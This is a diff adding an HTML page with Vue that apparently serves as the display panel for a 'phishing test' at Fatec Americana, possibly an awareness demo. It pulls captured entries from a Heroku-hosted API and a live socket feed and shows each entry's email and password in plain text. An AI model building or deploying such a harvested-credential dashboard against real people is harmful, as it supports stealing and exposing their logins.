@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title> Teste de pishing - Fatec Americana </title>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.8.0/css/bulma.css">
+</head>
+
+<body>
+  <div id="app">
+
+    <nav class="navbar is-warning" role="navigation" aria-label="main navigation">
+      <div class="navbar-brand">
+        <a class="navbar-item" href="/">
+          <img src="http://www.fatec.edu.br/wp-content/themes/fatec/img/logo-colorido.png" width="56" height="56">
+        </a>
+        <div class="navbar-item">
+          Teste de pishing - Fatec Americana
+        </div>
+
+      </div>
+    </nav>
+
+    <div style="background-color: aquamarine; margin-top: 50px;" class="card" v-for="user in users">
+      <div class="card-content">
+        <p class="title">
+          EMAIL: {{user.login}}
+        </p>
+        <p class="subtitle">
+          SENHA: {{user.password}}
+        </p>
+      </div>
+    </div>
+
+  </div>
+</body>
+
+<script src="https://cdn.socket.io/socket.io-1.0.0.js"></script>
+<script defer src="https://use.fontawesome.com/releases/v5.3.1/js/all.js"></script>
+<script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js">
+</script>
+<script>
+  // var socket = io();
+  var app = new Vue({
+    el: '#app',
+    data: {
+      users: null
+    },
+    mounted() {
+      axios
+        .get('https://fatec-portas-abertas-phishing.herokuapp.com/api/users')
+        .then(response => (this.users = response.data))
+
+      var socket = io('https://fatec-portas-abertas-phishing.herokuapp.com')
+
+      socket.on('new_user', data => {
+        this.users.unshift(data)
+      })
+    }
+  })
+
+</script>
+
+</html>
